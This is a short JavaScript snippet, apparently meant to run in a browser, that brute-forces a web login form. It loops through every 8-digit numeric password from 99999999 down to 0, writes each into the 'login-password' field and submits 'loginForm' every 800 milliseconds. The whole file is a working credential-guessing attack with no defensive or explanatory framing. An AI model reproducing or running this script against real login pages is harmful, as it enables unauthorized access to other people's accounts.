const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function delayedLoop() {
    for (let i = 99999999; i >= 0; i--) {
        s = String(i).padStart(8, "0");
        // console.log(s);
        document.getElementById("login-password").value = s;
        const loginForm = document.getElementById('loginForm');
        loginForm.dispatchEvent(new Event('submit'));
        await sleep(800);
    }
}

delayedLoop();